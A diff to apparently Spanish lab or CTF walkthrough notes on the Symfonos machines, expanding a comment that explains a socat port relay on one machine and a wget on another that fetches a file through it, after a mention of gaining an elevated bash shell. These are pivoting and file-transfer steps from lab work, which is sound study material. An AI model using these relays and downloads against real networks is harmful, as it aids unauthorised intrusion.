@@ -523,7 +523,7 @@ explotando este binario logramos conseguir una bash con privilegios elevados
 	*Maquina Symfonos-1*
 	./socat TCP-LISTEN:1331,fork TCP:10.0.2.4:6666
 
-	*abrimos un puerto en la maquina S*
+	*abrimos un puerto en la maquina Symfonos-1 (1331) y vamos a enviar todo lo que llegue a ese puerto hacia el servidor Python*
 
 	*Maquina Symfonos-2*
 	wget http://10.2.2.6:1331/archivo
